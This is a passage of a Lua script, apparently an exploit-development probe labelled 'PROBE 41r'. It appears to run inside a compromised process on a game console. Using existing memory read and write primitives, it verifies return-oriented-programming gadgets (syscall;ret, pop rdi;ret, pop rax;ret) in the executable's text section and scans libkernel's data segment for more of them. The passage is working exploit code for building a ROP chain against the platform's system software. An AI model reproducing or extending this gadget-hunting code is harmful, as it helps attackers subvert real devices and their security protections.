    print("VERIFICATION:")
    if #gadgets.syscall_ret > 0 then
        local off = gadgets.syscall_ret[1]
        local b0 = safe_rb(eboot_text + off)
        local b1 = safe_rb(eboot_text + off + 1)
        local b2 = safe_rb(eboot_text + off + 2)
        print(string.format("  syscall;ret at +0x%X: %02X %02X %02X %s",
            off, b0 or 0, b1 or 0, b2 or 0,
            (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "OK" or "BAD"))
    end
    if #gadgets.pop_rdi > 0 then
        local off = gadgets.pop_rdi[1]
        local b0 = safe_rb(eboot_text + off)
        local b1 = safe_rb(eboot_text + off + 1)
        print(string.format("  pop rdi;ret at +0x%X: %02X %02X %s",
            off, b0 or 0, b1 or 0,
            (b0 == 0x5F and b1 == 0xC3) and "OK" or "BAD"))
    end
    if #gadgets.pop_rax > 0 then
        local off = gadgets.pop_rax[1]
        local b0 = safe_rb(eboot_text + off)
        local b1 = safe_rb(eboot_text + off + 1)
        print(string.format("  pop rax;ret at +0x%X: %02X %02X %s",
            off, b0 or 0, b1 or 0,
            (b0 == 0x58 and b1 == 0xC3) and "OK" or "BAD"))
    end
else
    print("--- STEP 3: SKIPPED (text not readable) ---")
end
print("")

--------------------------------------------------------------------
-- STEP 4: Scan libkernel DATA for embedded code
-- PLT stubs or trampolines may exist in data segment
--------------------------------------------------------------------
print("--- STEP 4: LIBKERNEL DATA SCAN ---")
do
    -- get libkernel data base
    for off2 = 0, 0x1F8, 4 do safe_wd(info_buf + off2, 0) end
    safe_wd(info_buf, 0x160)
    pcall(function() sc_dynlib_get_info(uint64(0x2001), info_buf) end)
    local kd_lo = safe_rd(info_buf + 0x118)
    local kd_hi = safe_rd(info_buf + 0x11C)
    local kd_sz = safe_rd(info_buf + 0x120)
    if kd_lo and kd_hi then
        local kd_hex = string.format("0x%X%08X", kd_hi, kd_lo)
        local kd_addr = uint64(kd_hex)
        local test = safe_rd(kd_addr)
        if test then
            print("libkernel data at " .. kd_hex .. " sz=0x" .. string.format("%X", kd_sz or 0))
            local sr = 0
            local prdi = 0
            local prax = 0
            local interesting = {}
            local max_scan = math.min(kd_sz or 0x10000, 0x10000)
            for off = 0, max_scan - 4, 4 do
                local dw = safe_rd(kd_addr + off)
                if dw == nil then break end
                local b0 = dw % 256
                local b1 = math.floor(dw / 256) % 256
                local b2 = math.floor(dw / 65536) % 256
                if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
                    sr = sr + 1
                    interesting[#interesting + 1] = string.format("+0x%X: syscall;ret", off)
                end
                if b0 == 0x5F and b1 == 0xC3 then prdi = prdi + 1 end
                if b0 == 0x58 and b1 == 0xC3 then prax = prax + 1 end
            end
            print(string.format("  syscall;ret=%d pop_rdi=%d pop_rax=%d", sr, prdi, prax))
            for _, s in ipairs(interesting) do print("    " .. s) end
        else
            print("libkernel data NOT readable")
        end
    end
end
print("")

print("=== PROBE 41r COMPLETE ===")
```
